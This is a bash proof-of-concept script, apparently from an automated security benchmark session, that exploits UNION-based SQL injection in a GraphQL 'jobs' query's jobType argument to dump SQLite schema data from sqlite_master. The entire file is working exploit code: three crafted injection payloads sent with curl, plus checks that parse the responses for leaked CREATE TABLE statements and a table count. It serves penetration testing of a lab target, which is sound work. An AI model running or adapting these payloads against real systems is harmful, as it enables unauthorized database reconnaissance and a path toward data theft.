#!/bin/bash
# POC: POC demonstrating SQL injection via sqlite_master table to extract complete database schema information
# Target: ./repo
# Created: 2025-11-10T15:08:47.292Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# SQL Injection - Database Schema Disclosure via sqlite_master
# This POC demonstrates extracting the complete database schema using UNION-based SQL injection
# against SQLite's system table (sqlite_master)

TARGET_URL="${1:-http://localhost:5000/graphql/}"

echo "[*] SQL Injection - Database Schema Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Extract all table names and their CREATE statements
echo "[+] Test 1: Extracting database schema (all tables)"
echo "[*] Payload: UNION SELECT to sqlite_master table"
echo ""

PAYLOAD_1='{"query": "{ jobs(jobType: \\"'"'"' UNION SELECT 1,name,sql,sql FROM sqlite_master WHERE type='"'"'table'"'"' AND '"'"'1'"'"'='"'"'1\\") { id name type description } }"}'

echo "[*] Sending payload..."
RESPONSE_1=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD_1")

echo "[*] Response received:"
echo "$RESPONSE_1" | jq '.' 2>/dev/null || echo "$RESPONSE_1"
echo ""

# Check if schema information was disclosed
if echo "$RESPONSE_1" | grep -q "CREATE TABLE"; then
    echo "[+] SUCCESS: Database schema disclosed!"
    echo "[+] Schema information extracted from sqlite_master table:"
    echo "$RESPONSE_1" | jq -r '.data.jobs[].type' 2>/dev/null | head -5
    echo ""
    RESULT=0
else
    echo "[-] No schema information in response"
    RESULT=1
fi

# Test 2: Extract column information
echo "[+] Test 2: Attempting to extract specific table information"
echo "[*] Payload: Selecting table structure info"
echo ""

PAYLOAD_2='{"query": "{ jobs(jobType: \\"'"'"' UNION SELECT 1,name,sql,tbl_name FROM sqlite_master WHERE type='"'"'table'"'"'\\") { id name type description } }"}'

echo "[*] Sending payload..."
RESPONSE_2=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD_2")

echo "[*] Response received:"
echo "$RESPONSE_2" | jq '.' 2>/dev/null || echo "$RESPONSE_2"
echo ""

# Check for success
if echo "$RESPONSE_2" | grep -q "CREATE TABLE"; then
    echo "[+] SUCCESS: Table structure information extracted"
    RESULT=0
fi

# Test 3: Count tables in database
echo "[+] Test 3: Counting database tables"
echo "[*] Payload: COUNT query on sqlite_master"
echo ""

PAYLOAD_3='{"query": "{ jobs(jobType: \\"'"'"' UNION SELECT COUNT(*),COUNT(*),COUNT(*),COUNT(*) FROM sqlite_master WHERE type='"'"'table'"'"'\\") { id name type description } }"}'

echo "[*] Sending payload..."
RESPONSE_3=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD_3")

echo "[*] Response received:"
echo "$RESPONSE_3" | jq '.' 2>/dev/null || echo "$RESPONSE_3"
echo ""

if echo "$RESPONSE_3" | jq -e '.data.jobs[0].id' >/dev/null 2>&1; then
    TABLE_COUNT=$(echo "$RESPONSE_3" | jq -r '.data.jobs[0].id' 2>/dev/null)
    echo "[+] Database contains approximately $TABLE_COUNT tables"
    RESULT=0
fi

echo ""
echo "[*] POC Summary:"
echo "[*] - SQL injection confirmed in jobType parameter"
echo "[*] - Database schema accessible via sqlite_master table"
echo "[*] - Attacker can enumerate all tables and their structure"
echo "[*] - Complete database design exposed for reconnaissance"
echo ""

exit $RESULT